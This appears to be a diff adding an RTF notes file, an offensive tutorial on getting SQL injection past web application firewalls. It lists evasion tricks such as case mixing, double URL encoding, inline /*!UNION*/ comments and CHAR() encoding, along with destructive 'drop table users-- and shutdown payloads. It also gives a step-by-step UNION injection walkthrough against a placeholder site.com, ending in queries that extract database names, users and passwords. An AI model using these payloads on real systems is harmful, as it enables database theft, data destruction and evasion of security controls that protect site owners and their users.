@@ -1,0 +1,390 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fnil\fcharset0 Calibri;\f1\fnil\fcharset0 LucidaGrande;\f2\fswiss\fcharset0 ArialMT;
+\f3\froman\fcharset0 TimesNewRomanPSMT;\f4\fmodern\fcharset0 CourierNewPSMT;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red0\green0\blue255;\red190\green0\blue4;
+}
+{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid1\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{hyphen\}}{\leveltext\leveltemplateid2\'01\uc0\u8259 ;}{\levelnumbers;}\fi-360\li1440\lin1440 }{\listname ;}\listid1}
+{\list\listtemplateid2\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{square\}}{\leveltext\leveltemplateid101\'01\uc0\u9642 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{hyphen\}}{\leveltext\leveltemplateid102\'01\uc0\u8259 ;}{\levelnumbers;}\fi-360\li1440\lin1440 }{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{hyphen\}}{\leveltext\leveltemplateid103\'01\uc0\u8259 ;}{\levelnumbers;}\fi-360\li2160\lin2160 }{\listname ;}\listid2}
+{\list\listtemplateid3\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid201\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{hyphen\}}{\leveltext\leveltemplateid202\'01\uc0\u8259 ;}{\levelnumbers;}\fi-360\li1440\lin1440 }{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{hyphen\}}{\leveltext\leveltemplateid203\'01\uc0\u8259 ;}{\levelnumbers;}\fi-360\li2160\lin2160 }{\listname ;}\listid3}
+{\list\listtemplateid4\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{square\}}{\leveltext\leveltemplateid301\'01\uc0\u9642 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{hyphen\}}{\leveltext\leveltemplateid302\'01\uc0\u8259 ;}{\levelnumbers;}\fi-360\li1440\lin1440 }{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{hyphen\}}{\leveltext\leveltemplateid303\'01\uc0\u8259 ;}{\levelnumbers;}\fi-360\li2160\lin2160 }{\listname ;}\listid4}}
+{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}{\listoverride\listid2\listoverridecount0\ls2}{\listoverride\listid3\listoverridecount0\ls3}{\listoverride\listid4\listoverridecount0\ls4}}
+\paperw11900\paperh16840\margl1440\margr1440\vieww17280\viewh10460\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\b\fs30 \cf1 \cb2 \expnd0\expndtw0\kerning0
+\ul \ulc1 BYPASSING FILTERS:\
+
+\b0 \ulnone \
+http://kaoticcreations.blogspot.co.uk/p/sql-injection-waf-bypassing.html\
+\
+The idea behind it is to probe a lot changing the chars used to see if you can bypass the filters!\
+\pard\tx940\tx1440\pardeftab720\li1440\fi-1440\partightenfactor0
+\ls1\ilvl1\cf1 \kerning1\expnd0\expndtw0 {\listtext	
+\f1 \uc0\u8259 
+\f0 	}Change commands\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}Upper/Lower case\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}Encoding\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}Concat\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}SELSELECTECT\expnd0\expndtw0\kerning0
+\
+\pard\pardeftab720\partightenfactor0
+\cf1 \
+1. Avoiding Blocked Characters\
+\
+	Use CHAR() OR ASCII\
+\pard\tx1660\tx2160\pardeftab720\li2160\fi-2160\partightenfactor0
+\ls2\ilvl2\cf1 \kerning1\expnd0\expndtw0 {\listtext	
+\f1 \uc0\u8259 
+\f0 	}SELECT name,password FROM amp WHERE name=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(115)\expnd0\expndtw0\kerning0
+\
+\pard\pardeftab720\partightenfactor0
+\cf1 \
+\
+2. Circumventing Simple Validation\
+\
+	Change SELECT:\
+\pard\tx1660\tx2160\pardeftab720\li2160\fi-2160\partightenfactor0
+\ls3\ilvl2\cf1 \kerning1\expnd0\expndtw0 {\listtext	
+\f1 \uc0\u8259 
+\f0 	}SeLeCt\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}%00SELECT\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}SELSELECTECT\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}%53%45%4c%45%43%54\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}%2553%2545%254c%2545%2543%2554\expnd0\expndtw0\kerning0
+\
+\pard\pardeftab720\partightenfactor0
+\cf1 \
+3. Using SQL Comments\
+\
+	SELECT/*foo*/username,password/*foo*/FROM/*foo*/users\
+	SEL/*foo*/ECT username,password FR/*foo*/OM users\
+\
+4. Exploit Defective Filters\
+\
+	Input validation routines contain logic flaws that you can exploit to smuggle blocked input past the filter\
+\
+5. Second-Order SQLi\
+\
+	Apps handle data safely only the first time inserted in database but it may later get exploited\
+\
+6. Advanced Exploitation\
+\
+	\'92shutdown- -\
+	\'91drop table users- -	\
+	\'91drop table account- -\
+\
+7. Retrieving Data as Numbers\
+	\
+	Inject queries in such a way that meaningful data can be retrieved in numeric form\
+\pard\tx1660\tx2160\pardeftab720\li2160\fi-2160\partightenfactor0
+\ls4\ilvl2\cf1 \kerning1\expnd0\expndtw0 {\listtext	
+\f1 \uc0\u8259 
+\f0 	}ASCII\
+{\listtext	
+\f1 \uc0\u8259 
+\f0 	}SUBSTRING OR SUBSTR\
+\pard\tx566\tx1133\tx1700\pardeftab720\partightenfactor0
+\cf1 \expnd0\expndtw0\kerning0
+\
+8. Using an Opt-of-Band Channel\
+\
+9. Using inference Conditional Responses\
+	\
+\
+\
+
+\b\fs32 \ul EXAMPLES:\
+
+\b0\fs30 \ulnone 	\
+Your goal is to run the command with no errors. If an error occurs that means that the filter  successfully identified the command and we must change it.\
+\
+\pard\pardeftab720\partightenfactor0
+
+\fs28 \cf3 \'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725"}}{\fldrslt \cf4 http://www.site.com/index.php?id=725}}\cf1 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 (No Errors)h
+\f2 \
+
+\f0 \'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f2 \cf4 http://www.site.com/index.php?id=725\'92}}\'92\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 (Errors!!)
+\f2 \
+
+\f0 \cf3 \'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725+ORDER+BY+1,2,3,4,5"}}{\fldrslt \cf4 http://www.site.com/index.php?id=725+ORDER+BY+1,2,3,4,5}}--\cf1 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 (No Errors)
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf3 \'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725+ORDER+BY+1,2,3,4,5,6"}}{\fldrslt \cf4 http://www.site.com/index.php?id=725+ORDER+BY+1,2,3,4,5,6}}--\cf1 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \'a0 (Errors!!)
+\f2 \
+
+\f0 \cf3 \'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725+UNION+SELECT+1,2,3,4,5"}}{\fldrslt \cf4 http://www.site.com/index.php?id=725+UNION+SELECT+1,2,3,4,5}}--\cf1 \'a0\'a0\'a0\'a0\'a0 \'a0 (403 Forbidden)
+\f2 \
+
+\f0 \cf3 \'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5"}}{\fldrslt \cf4 http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5}}--\cf1 \'a0\'a0\'a0\'a0\'a0 \'a0(403 Forbidden)
+\f2 \
+\pard\tx566\tx1133\tx1700\pardeftab720\partightenfactor0
+
+\f0 \cf1 \
+\
+\pard\pardeftab720\partightenfactor0
+\cf1 Now we will see if we can get one past the WAF system by using some comments to hide the parts of our statement that our most likely being filtered. In basic form it will look like this:
+\f2 \
+\
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725+UNION+SELECT+1,2,3,4,5"}}{\fldrslt 
+\f0 \cf4 http://www.site.com/index.php?id=725+UNION+SELECT+1,2,3,4,5}}
+\f0 \cf3 --\cf1 \'a0\'a0\'a0\'a0 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \'a0\'a0 (403 Forbidden)
+\f2 \
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5"}}{\fldrslt 
+\f0 \cf4 http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5}}
+\f0 \cf3 --\cf1 \'a0\'a0 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \'a0\'a0\'a0 \'a0(403 Forbidden)
+\f2 \
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,2,3,4,5"}}{\fldrslt 
+\f0 \cf4 http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,2,3,4,5}}
+\f0 \cf3 --\cf1 \'a0\'a0\'a0\'a0 (No Errors!!)\
+\pard\tx566\tx1133\tx1700\pardeftab720\partightenfactor0
+\cf1 \
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,CONCAT(database(),user(),version()),3,4,5"}}{\fldrslt \cf4 http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,CONCAT(database(),user(),version()),3,4,5}}\cf3 --\cf1 \'a0 (403 Forbidden \'96 WTF?)\
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,ConCAt(database(),user(),version()),3,4,5"}}{\fldrslt 
+\fs26 \cf4 http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,ConCAt(database(),user(),version()),3,4,5}}
+\fs26 \cf3 --\cf1 \'a0 (No Errors!!)\
+\
+These two techniques can be combined to evade filters throughout your Injections as you will see. Now let us try to get the list of all the databases available, instead of just the current one, like so:
+\f2 \
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,GROUP_CONCAT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEMA.SCHEMATA"}}{\fldrslt 
+\f0 \cf4 http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,GROUP_CONCAT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEMA.SCHEMATA}}
+\f0 \cf3 --\cf1 \'a0 (403 Forbidden)\
+\pard\pardeftab720\partightenfactor0
+
+\fs30 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\fs26 \cf1 Luckily we know what to do now so start by altering GROUP_CONCAT, same as we did for CONCAT:
+\f2 \
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA"}}{\fldrslt 
+\f0 \cf4 http://www.site.com/index.php?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA}}
+\f0 \cf3 --\cf1 \'a0 (No Errors!!)
+\f2 \
+\pard\tx566\tx1133\tx1700\pardeftab720\partightenfactor0
+
+\f0\fs30 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf1 EXTRA EXAMPLES:\
+\pard\pardeftab720\partightenfactor0
+
+\f2\b0 \cf1 \
+
+\f0 Admins will filter all kinds of things, like words (UNION, SELECT, LIKE) and symbols (=, !=, \'91) so here is some additional examples to help get you on your way:
+\f2 \
+\
+
+\f0 Using the comments to break up the possible standard versions that would be used and therefore possible filtered.
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 /**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 union select column from table
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 /*!union*/+/*!select*/+1,2,3\'97\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 Union select 1,2,3
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 /*!UnIOn*//*!SeLect*/+1,2,3\'97\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 Union select 1,2,3
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 un/**/ion+sel/**/ect+1,2,3\'97\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 Union select 1,2,3
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3\'97\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 Union select 1,2,3
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 Query within query (stacked query) and both methods in use:
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WHERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
+\f2 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 If you can\'92t use the 
+\b WHERE
+\b0  function, try replacing with some form of the LIMIT function:
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 LIMIT 0,1
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 note that 0,1 gets 1 result starting from the 0\super th\nosupersub  row (first entry)
+\f2 \
+
+\f4 o
+\f3 \'a0\'a0 
+\f0 to view the second table, we change limit 0,1 to limit 1,1
+\f2 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 If you can\'92t use the \'93=\'94 sign try using the not equal to sign \'93!=\'94 instead to see if you can use this to find other items based on any base you have found. i.e. If you know the current DB, you could then check for !=database() to possibly find alternative databases (or tables or columns) in your request statement
+\f2 \
+\
+
+\f0 If you can use one, you might be able to try another:
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 If substring() is being filtered you can also use mid() OR substr() to get similar results\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 select user from mysql.user where user = 'user' OR mid(password,1,1)='*'
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 If ascii() is being filtered you can also use hex() OR bin() to get similar results
+\f2 \
+
+\f1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 If you can\'92t use benchmark() you might also try sleep()
+\f2 \
+
+\f1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 0x3a can be used to replace a colon ':' as it is the HEX value\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 Helpful in separating results\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 i.e. group_concat(user,0x3a,fd_Password) = user:fd_Password
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 0x0a can be used to create new line for results to be displayed easier
+\f2 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 I like to start when doing my vulnerability checks to see how the system is filtering things. If you try using double quotes, single quotes, pound symbols, comments, etc all to both see if they trigger any errors indicating the site is vulnerable but also to take note of the methods being used to filter input.
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 \'91 becomes \'93\'92 or */, play with things and take mental notes and you will see patterns over time, same is true of errors when UNION is missing or CONCAT it is another clue of what is going on the other side
+\f2 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 I have not found a complete list but would like to have one for reference of which filters indicate what type of WAF/IDS is in use, so if anyone has something please message me or send my way so I can make an update to include
+\f2 \
+\pard\tx566\tx1133\tx1700\pardeftab720\partightenfactor0
+
+\f0 \cf1 \
+}
